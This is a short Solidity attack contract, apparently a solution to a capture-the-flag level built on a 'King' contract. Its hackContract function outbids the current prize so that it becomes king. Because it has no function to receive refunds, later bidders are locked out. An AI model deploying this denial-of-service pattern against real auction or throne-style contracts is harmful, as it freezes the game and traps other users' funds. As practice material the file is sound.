// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }


    function hackContract() external {
        //get amount of latest prize
        uint256 prize = King(payable(contractAddress)).prize();

        //send just a little bit more than current prize
        (bool success,) = payable(contractAddress).call{value: prize + 1, gas: 100000}("");
        
        require(success, "CALL_FAILED");
    }
}